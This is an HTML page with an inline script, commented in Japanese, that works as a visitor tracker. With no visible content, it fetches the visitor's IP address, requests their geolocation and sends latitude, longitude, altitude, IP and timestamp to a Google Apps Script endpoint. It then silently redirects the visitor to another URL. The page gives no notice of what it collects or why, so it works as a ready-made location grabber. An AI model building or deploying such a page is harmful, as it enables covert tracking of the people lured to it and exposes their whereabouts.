<!DOCTYPE html>
<html>
<head>
  <title>Netlify + GAS Integration</title>
</head>
<body>
  <script>
    // IPアドレスの取得（Netlify Functionを使用）
    fetch('/.netlify/functions/getIpAddress')
      .then(response => response.text())  // JSONではなくテキストとして受け取る
      .then(ipAddress => {
        console.log('IP Address:', ipAddress.trim()); // 不要な空白を削除

        // 位置情報の取得
        navigator.geolocation.getCurrentPosition(function(position) {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          // 本体情報の取得（仮の値として null を設定）
          const bodyInfo = null;

          // 高度の取得（仮の値として null を設定）
          const altitude = position.coords.altitude || null;

          // 時間の取得
          const time = new Date();

          // Google Apps Scriptにデータを送信
          const gasScriptURL = `https://script.google.com/macros/s/your_script_id/exec?latitude=${latitude}&longitude=${longitude}&ipAddress=${ipAddress}&bodyInfo=${bodyInfo}&altitude=${altitude}&time=${time}`;
          fetch(gasScriptURL)
            .then(response => response.text())
            .then(data => {
              console.log('Data sent to GAS:', data);
              // 送信完了後に特定のURLにリダイレクト
              window.location.href = 'https://example.com/success'; // 適切なURLに変更してください
            })
            .catch(error => {
              console.error('Error sending data to GAS', error);
            });
        });
      })
      .catch(error => {
        console.error('Error getting IP address', error);
      });
  </script>
</body>
</html>
